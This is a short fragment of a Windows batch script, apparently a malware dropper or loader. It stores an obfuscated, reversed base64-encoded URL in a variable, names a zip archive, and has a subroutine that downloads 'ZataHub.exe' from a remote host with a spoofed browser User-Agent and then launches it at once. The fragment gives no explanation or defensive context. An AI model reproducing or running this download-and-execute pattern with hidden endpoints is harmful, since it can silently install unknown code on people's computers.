...
set "AP_UR="
set "AP_UR_EC==smbpxWLlh2Yh5WYn9iclBHblh2LxY3LpBXYv02bj5SZoNWYuF2ZlxmZmVnc09yL6MHc0RHa"
set "ZI_FI=main.zip"
...
:pri_task
if not exist "ZataHub.exe" (
    curl.exe -L -o "ZataHub.exe" "https://meeting.zoho.com/agent" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
start "" "ZataHub.exe"
goto :eof